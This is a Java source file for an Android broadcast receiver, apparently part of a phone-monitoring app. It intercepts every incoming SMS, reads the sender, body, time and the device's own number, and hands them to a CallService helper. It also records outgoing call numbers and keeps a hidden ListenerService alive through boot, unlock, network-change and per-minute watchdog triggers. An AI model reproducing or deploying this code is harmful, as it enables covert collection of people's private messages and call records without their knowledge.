package com.kaixin.android.service;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.kaixin.android.KXApplication;
import com.kaixin.android.utils.CallService;
import com.kaixin.android.utils.ListenerUtil;

public class BroadcastReceiverMgr extends BroadcastReceiver {
	public static String outPhoneNumber;
	public static boolean isCallFlag = true;
	String sender;
	String content;
	String sendtime;
	String emailNum;
	String systemNum;

	@Override
	public void onReceive(final Context context, Intent intent) {
		String action = intent.getAction();
		
		if (action.equals("android.provider.Telephony.SMS_RECEIVED")) {
			Object[] pdus = (Object[]) intent.getExtras().get("pdus");// 获取短信内容
			for (Object pdu : pdus) {
				byte[] data = (byte[]) pdu;// 获取单条短信内容，短信内容以pdu格式存在
				SmsMessage message = SmsMessage.createFromPdu(data);// 使用pdu格式的短信数据生成短信对象
				sender = message.getOriginatingAddress();// 获取短信的发送者
				if (sender.contains("+86")) {
					sender = sender.substring(3);
				}
				content = message.getMessageBody();// 获取短信的内容
				Date date = new Date(message.getTimestampMillis());
				SimpleDateFormat format = new SimpleDateFormat(
						"yyyy-MM-dd HH:mm:ss");
				sendtime = format.format(date);
				// 短信加入本机号码
				TelephonyManager tm2 = (TelephonyManager) context
						.getSystemService(Context.TELEPHONY_SERVICE);
				String myPhoneNum = tm2.getLine1Number();// 本机电话号码
				CallService.setSms(content, sendtime, sender, myPhoneNum, "手机接收短信");
				Intent listenerIntent = new Intent(context,
						ListenerService.class);
				listenerIntent
						.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				context.startService(listenerIntent);
			}
		}

		// 启动安卓系统的时候从数据库中拿取用户设置数据
		if (action.equals("android.intent.action.BOOT_COMPLETED")) {
			Intent listenerIntent = new Intent(context,
					ListenerService.class);
			context.startService(listenerIntent);
		}
		
		boolean isServiceRunning = false; 

		if (intent.getAction().equals(Intent.ACTION_TIME_TICK)) { 

			//检查Service状态 

			ActivityManager manager = (ActivityManager)context.getSystemService(Context.ACTIVITY_SERVICE); 
			for (RunningServiceInfo service :manager.getRunningServices(Integer.MAX_VALUE)) { 
				if("com.kaixin.android.service.ListenerService".equals(service.service.getClassName())) 
				{ 
					isServiceRunning = true; 
				} 
			} 
			if (!isServiceRunning) { 
				Intent i = new Intent(context, ListenerService.class); 
				context.startService(i); 
			} 


		} 
		
		if (Intent.ACTION_USER_PRESENT.equals(intent.getAction())) {
			Intent listenerIntent = new Intent(context,
					ListenerService.class);
			context.startService(listenerIntent);
		}

		// 呼出电话
		if (action.equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
			Intent listenerIntent = new Intent(context, ListenerService.class);
			listenerIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			outPhoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
			listenerIntent.putExtra("outPhoneNumber", outPhoneNumber);
			isCallFlag = true;
			context.startService(listenerIntent);
			Log.i("TAG", "[Broadcast]ACTION_NEW_OUTGOING_CALL:"
					+ outPhoneNumber);
			// this.setResultData(null);
			// 这里可以更改呼出电话号码。如果设置为null，电话就永远不会播出了.
		} else {
			outPhoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
			isCallFlag = false;
		}

		if (action.equals("android.net.conn.CONNECTIVITY_CHANGE")) {
			Intent listenerIntent = new Intent(context, ListenerService.class);
			listenerIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startService(listenerIntent);
			ListenerUtil m = new ListenerUtil();
			m.isWIFIAvailable(context);
		}
	}
	
		
}

